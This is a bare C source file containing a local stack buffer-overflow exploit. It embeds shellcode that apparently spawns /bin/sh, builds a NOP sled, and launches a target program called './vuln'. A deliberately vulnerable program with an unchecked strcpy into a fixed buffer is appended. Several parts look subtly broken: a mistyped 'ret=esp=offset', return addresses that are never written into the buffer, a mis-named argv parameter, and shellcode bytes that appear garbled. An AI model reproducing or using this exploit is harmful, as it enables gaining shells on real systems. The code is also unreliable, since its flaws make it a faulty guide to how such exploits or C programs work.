#include<stdlib.h>
char shellcode[]=
"\x31\xc0\xb0\x46\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x8d\x4b\x08\x8d"
"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68";
unsigned long sp(void)
{__asm__("movl %esp,%eax");}

int main(int argc,char *argv[])
{
	int i,offset;
	long esp,ret,*addr_ptr;
	char *buffer,*ptr;
	offset=0;
	esp=sp();
	ret=esp=offset;
	printf("xxx");
	buffer=malloc(600);
	ptr=buffer;
	addr_ptr=(long * )ptr;
	for (i=0;i<600;i++)
	buffer[i]='\x90';
	ptr=buffer+200;
	for(i=0;i<strlen(shellcode);i++)
	{*(ptr++)=shellcode[i];}
	buffer[600-1]=0;
	execl("./vuln","vuln",buffer,0);
	free(buffer);
	return 0;
}
// the vulner program
int main(int argc,char * argc[])
{
	char buffer[500];
	strcpy(buffer,argv[1]);
	return 0;
}
